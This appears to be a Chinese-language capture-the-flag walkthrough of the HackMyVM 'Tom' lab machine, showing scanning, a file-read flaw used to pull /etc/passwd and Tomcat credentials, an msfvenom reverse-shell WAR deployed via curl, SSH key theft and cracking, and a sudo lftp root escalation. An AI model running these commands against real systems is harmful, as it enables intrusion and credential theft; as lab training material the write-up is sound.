@@ -1,0 +1,292 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/yRG8CdhaI4zyQUgO1QE6mw)
+
+ ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 59篇原创内容   公众号
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvVsJ6xEtdjxGPfOIA8zFXJkhicmBF58swSrMkQejs7foic6khQbLJkII5WfpqaiarZIyyHvgwpA8ictg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)  
+
+靶机信息
+----
+
+下载地址:
+
+```
+https://hackmyvm.eu/machines/machine.php?vm=Tom  
+网盘链接：https://pan.baidu.com/s/1MYO7cEOg2xou1FrC40v6qg?pwd=ja7r
+```
+
+靶场: HackMyVm.eu
+
+靶机名称: Tom
+
+难度: 简单
+
+发布时间: 2021年10月15日
+
+提示信息:
+
+```
+无
+```
+
+目标: user.txt和root.txt
+
+  
+
+实验环境
+----
+
+```
+攻击机:VMware kali 10.0.0.3 eth0桥接互联网，eth1桥接vbox-Host-Only  
+  
+靶机:Vbox linux IP自动获取 网卡host-Only
+```
+
+  
+
+信息收集
+----
+
+### 扫描主机
+
+扫描局域网内的靶机IP地址
+
+```
+sudo nmap -sP 10.0.0.1/24
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+扫描到主机地址为10.0.0.
+
+### 扫描端口
+
+扫描靶机开放的服务端口
+
+```
+sudo nmap -sC -sV -p- 10.0.0. -oN nmap.log
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+扫描到3个开放端口，让我们从80端口开始查找敏感信息
+
+Web渗透
+-----
+
+```
+http://10.0.0.108
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+首页是apache2的默认页面，源码中未找到任何可利用的信息，让我们来做个目录扫描
+
+### 目录扫描
+
+```
+gobuster dir -u http://10.0.0.108 -w ../../Dict/SecLists-2022.1/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,zip
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+扫描到一个php页面，我们去访问看看
+
+```
+http://10.0.0.108/tomcat.php
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+访问后是一个空页面，源码中没有任何内容，让我们用FUZZ模糊测试下是否为文件读取或命令执行
+
+```
+wfuzz -u http://10.0.0.108/tomcat.php?FUZZ=id -w /usr/share/wordlists/dirb/big.txt --hw=0
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+命令执行没有任何收获，再来试试文件读取
+
+```
+wfuzz -u http://10.0.0.108/tomcat.php?FUZZ=/etc/passwd -w /usr/share/wordlists/dirb/big.txt --hw=0
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+检测到文件读取参数为filez，来收集一波敏感信息
+
+```
+view-source:http://10.0.0.108/tomcat.php?filez=/etc/passwd
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+找到一个用户nathan看看这个用户目录下面有没有id_rsa文件
+
+```
+view-source:http://10.0.0.108/tomcat.php?filez=/home/nathan/.ssh/id_rsa
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+  
+
+获取不到id_rsa文件可能是没权限，看看8080端口
+
+```
+http://10.0.0.108:8080
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+Tomcat9的默认页面，可以通过管理页面上传反弹shell。但是需要账号密码，可以通过80端口的文件读取来获取tomcat的配置文件
+
+```
+view-source:http://10.0.0.108/tomcat.php?filez=/usr/share/tomcat9/etc/tomcat-users.xml
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到账号密码了，登录验证一下
+
+```
+http://10.0.0.108:8080
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+权限不够没有上传页面，没关系我们可以通过文件路径来上传
+
+1。用msfvenom生成反弹shell
+
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.3 LPORT=4444 -f war -o shell.war
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+2。上传反弹shell
+
+```
+curl --upload-file shell.war -u 'sml:<password>' 'http://10.0.0.108:8080/manager/text/deploy?path=/shell'
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+3。攻击机监听4444端口
+
+```
+nc -lvvp 4444
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+4。访问shell触发反弹
+
+```
+http://10.0.0.108:8080/shell/
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+反弹成功，先切换到交互式shell
+
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'  
+export TERM=xterm  
+Ctrl+z快捷键  
+stty raw -echo;fg  
+reset
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+切换完成，来找找敏感信息
+
+```
+sudo -l
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+找到可以使用nathan用户身份执行ascii85命令。ascii85可以读取文件，尝试读取id_rsa文件
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+```
+sudo -u nathan ascii85 /home/nathan/.ssh/id_rsa | ascii85 -d
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到key保存为id_rsa文件再去登录SSH
+
+```
+vi id_rsa  
+chmod 600 id_rsa  
+ssh nathan@10.0.0.108 -i id_rsa
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+登录失败，key还有密码，去暴破下
+
+```
+RSAcrack -k id_rsa -w /usr/share/wordlists/rockyou.txt
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到key的密码，登录SSH
+
+```
+ssh nathan@10.0.0.108 -i id_rsa
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+登录成功，先找找flag
+
+```
+ls  
+cat user.txt
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到usr.txt，再来找找提权信息
+
+```
+sudo -l
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+我们可以使用root用户身份执行lftp命令，先找一下lftp如何提权
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+提权
+--
+
+```
+sudo lftp -c '!/bin/bash'
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+提权成功，查看rootflag
+
+```
+cd /root  
+ls  
+cat r00t.txt
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到root.txt，游戏结束
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
